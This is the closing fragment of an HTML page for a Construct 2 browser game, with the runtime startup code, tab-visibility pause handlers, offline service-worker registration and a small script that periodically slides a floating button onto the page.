lunarray_Tween.prototype.acts.Start,cr.behaviors.lunarray_Tween.prototype.exps.isPaused,cr.behaviors.lunarray_Tween.prototype.exps.Target,cr.behaviors.lunarray_Tween.prototype.exps.Value,cr.plugins_.SkymenSFPlusPLus.prototype.acts.SetCharPos,cr.plugins_.SkymenSFPlusPLus.prototype.acts.Redraw,cr.system_object.prototype.exps.loadingprogress,cr.plugins_.TiledBg.prototype.exps.Opacity,cr.plugins_.HTML_Div_Pode.prototype.acts.Destroy,cr.plugins_.sirg_notifications.prototype.acts.SetPosition,cr.plugins_.GameAnalytics.prototype.acts.initialize,cr.plugins_.skymen_siteLock.prototype.cnds.SiteLock,cr.plugins_.Browser.prototype.acts.GoToURL]};
    </script>

    <script>
		// Start the Construct 2 project running on window load.
		jQuery(document).ready(function ()
		{			
			// Create new runtime using the c2canvas
			cr_createRuntime("c2canvas");
		});
		
		// Pause and resume on page becoming visible/invisible
		function onVisibilityChanged() {
			if (document.hidden || document.mozHidden || document.webkitHidden || document.msHidden)
				cr_setSuspended(true);
			else
				cr_setSuspended(false);
		};
		
		document.addEventListener("visibilitychange", onVisibilityChanged, false);
		document.addEventListener("mozvisibilitychange", onVisibilityChanged, false);
		document.addEventListener("webkitvisibilitychange", onVisibilityChanged, false);
		document.addEventListener("msvisibilitychange", onVisibilityChanged, false);
		
		function OnRegisterSWError(e)
		{
			console.warn("Failed to register service worker: ", e);
		};
		
		// Runtime calls this global method when ready to start caching (i.e. after startup).
		// This registers the service worker which caches resources for offline support.
		window.C2_RegisterSW = function C2_RegisterSW()
		{
			if (!navigator.serviceWorker)
				return;		// no SW support, ignore call
			
			try {
				navigator.serviceWorker.register("sw.js", { scope: "./" })
				.then(function (reg)
				{
					console.log("Registered service worker on " + reg.scope);
				})
				.catch(OnRegisterSWError);
			}
			catch (e)
			{
				OnRegisterSWError(e);
			}
		};
    </script>
	<script>
document.addEventListener('DOMContentLoaded', function(){
  var style = `#button {
  display:none;
}
.imgb_vis {
  animation: imgb-animation 7s linear;
}
@keyframes imgb-animation {
  10% {
    transform: translateX(0);
  }
  20% {
    transform: translateX(100px);
  }
  90% {
    transform: translateX(100px);
  }
  100% {
    transform: translateX(0);
  }
}`;
  addStyle(style);

  var div = document.createElement('div');
  div.id = 'button';
  div.className = 'imgb';
  div.style = 'position:fixed;top:10%;left:-100px;z-index:10';
  div.innerHTML = '';
  document.body.appendChild(div);

  var image = document.getElementById('button');
  var i = 0;
  var s = ['block', 'none'];
  var t = [7000, 70000];
  show();

  document.querySelector('.imgb').classList.add('imgb_vis');

  function addStyle(styles) {
    var css = document.createElement('style');
    css.type = 'text/css';

    if (css.styleSheet) {
      css.styleSheet.cssText = styles;
    } else {
      css.appendChild(document.createTextNode(styles));
    }

    document.getElementsByTagName('head')[0].appendChild(css);
  }

  function show() {
    i ^= 1;
    image.style.display = s[i];
    setTimeout(show, t[i]);
  }
});
    </script>
 

<script>gadgets.util.runOnLoadHandlers();</script><script>window.google.csi.tickDl();
</script></body></html>
